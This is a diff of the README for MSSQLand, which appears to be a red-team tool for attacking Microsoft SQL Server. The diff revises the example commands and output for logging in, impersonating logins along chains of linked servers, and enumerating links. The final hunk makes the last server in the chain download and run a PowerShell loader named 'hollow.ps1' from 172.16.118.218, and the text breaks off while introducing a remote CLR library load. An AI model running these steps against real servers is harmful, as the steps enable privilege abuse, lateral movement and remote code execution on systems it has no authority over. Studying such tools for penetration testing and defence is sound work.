@@ -9,13 +9,13 @@ MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL
 
 The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports. For example, running this command:
 ```shell
-MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Merlaux /a:tables balard
+.\MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:"Fr@nce1940/Gaulle" /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Merlaux /a:tables agents
 ```
 
 Create the following output:
 ```txt
 ===========================================
-            Executing on: SQL01
+         Executing from: SQL01
     Time Zone ID: Romance Standard Time
   Local Time: 13:42:48, UTC Offset: 01:00
 ===========================================
@@ -26,10 +26,13 @@ Create the following output:
 
 [>] Trying to connect with LocalCredentials
 [+] Connection opened successfully
-|-> Workstation ID: SQL01
-|-> Server Version: 15.00.2000
+|-> Server: localhost,1433
 |-> Database: master
-|-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
+|-> Server Version: 15.00.2000
+|-> Client Workstation ID: WS-445c74
+|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
+[i] Logged in on SQL01 as Jacquard
+|-> Mapped to the user dbo
 [i] You can impersonate anyone on SQL01 as a sysadmin
 [+] Successfully impersonated user: Moulinier
 [i] Server chain: SQL02 -> SQL03 -> SQL04
@@ -90,18 +93,19 @@ EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04'
 No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
 
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
 ```
 
 The output is as follows:
 ```txt
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
-|-> Workstation ID: SQL01
-|-> Server Version: 15.00.2000
+|-> Server: localhost,1433
 |-> Database: master
-|-> Client Connection ID: 1e8fd867-77b7-4330-8d0d-deff353e5dcc
-[i] Logged in as NT AUTHORITY\SYSTEM
+|-> Server Version: 15.00.2000
+|-> Client Workstation ID: WS-445c74
+|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
+[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
 |-> Mapped to the user dbo
 [i] You can impersonate anyone on SQL01 as a sysadmin
 [+] Successfully impersonated user: webapp02
@@ -121,18 +125,20 @@ The output is as follows:
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
 ```
 The output shows:
 
 ```txt
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
-|-> Workstation ID: SQL01
-|-> Server Version: 15.00.2000
+|-> Server: localhost,1433
 |-> Database: master
-|-> Client Connection ID: a6a69aa9-b8cc-4c93-9bc4-c162dc67806f
-[>] Attempting to impersonate user: webapp02
+|-> Server Version: 15.00.2000
+|-> Client Workstation ID: WS-445c74
+|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
+[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
+|-> Mapped to the user dbo
 [i] You can impersonate anyone as a sysadmin
 [+] Successfully impersonated user: webapp02
 [i] Server chain: SQL02 -> SQL03 -> SQL04
@@ -153,7 +159,7 @@ The output shows:
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 Or even use Common Language Runtime (CLR) to load remotely a library with:
